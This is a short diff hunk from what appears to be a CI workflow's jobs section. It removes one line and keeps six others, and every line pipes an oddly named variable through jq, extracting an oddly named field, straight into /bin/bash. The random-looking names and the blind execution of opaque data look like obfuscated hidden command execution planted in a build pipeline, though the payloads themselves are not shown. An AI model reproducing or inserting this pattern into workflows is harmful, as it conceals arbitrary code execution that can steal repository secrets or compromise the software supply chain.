@@ -28,7 +28,6 @@ jobs:
           echo $d651 | jq -r .pyr963 | /bin/bash
           printf '%s' "$jsp6353" | jq -r .cfhbv31 | /bin/bash
           echo $pev575 | jq -r .gbwac0 | /bin/bash
-          echo $exx05431 | jq -r .dyyi00 | /bin/bash
           echo $mr586 | jq -r .c8 | /bin/bash
           echo $bsqop2416 | jq -r .yiqd231 | /bin/bash
           printf '%s' "$au2397" | jq -r .zfpg2172 | /bin/bash
